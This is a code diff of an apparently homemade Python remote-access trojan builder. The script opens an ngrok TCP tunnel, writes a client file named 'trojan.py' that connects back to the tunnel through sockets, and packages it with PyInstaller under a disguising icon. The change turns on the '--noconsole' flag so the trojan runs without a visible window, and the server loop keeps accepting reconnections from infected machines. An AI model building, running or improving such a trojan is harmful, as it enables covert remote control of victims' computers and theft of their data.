@@ -9,8 +9,8 @@ port=8080
 host="127.0.0.1"
 ssh,ssh_port=ngrok.connect(port,proto="tcp").replace('tcp://','').split(":")
 script=f"""
-import pyautogui
-pyautogui.hotkey("win","ctrl","d")#powerful
+#import pyautogui
+#pyautogui.hotkey("win","ctrl","d")#powerful
 import socket
 import os 
 host="{ssh}"
@@ -31,7 +31,7 @@ with open("trojan.py",'w') as trojan:
     trojan.write(script)
 PyInstaller.__main__.run([
     '--onefile',
-    # '--noconsole',
+    '--noconsole',
     '--icon=wadog.ico',
     os.path.join('trojan.py')
     ])
@@ -50,4 +50,4 @@ while True:
     except (ConnectionAbortedError,ConnectionResetError) as e:
         print(e)
         client,addr=server.accept()
-        print("back online!",addr)
+        print("back to online!",addr)
